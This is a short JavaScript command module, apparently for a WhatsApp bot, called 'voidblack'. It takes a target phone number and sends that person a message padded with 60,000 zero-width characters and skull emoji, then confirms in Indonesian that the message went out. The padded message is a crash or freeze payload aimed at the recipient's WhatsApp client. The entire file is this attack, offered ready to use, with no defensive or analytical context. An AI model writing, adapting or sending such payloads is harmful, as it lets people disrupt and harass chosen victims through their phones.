module.exports = {
  name: 'voidblack',
  execute: async (client, message, args) => {
    const target = args[0];
    if (!target) {
      return message.reply('👑 Format: .voidblack [target]');
    }

    const blackPayload = '\u200B\u200C\u200D'.repeat(20000) + '💀☠️ VOID BLACK SUPREME.';
    await client.sendMessage(target + '@s.whatsapp.net', { text: blackPayload });

    return message.reply(`👑 Void Black berhasil dikirim ke ${target}.`);
  }
};
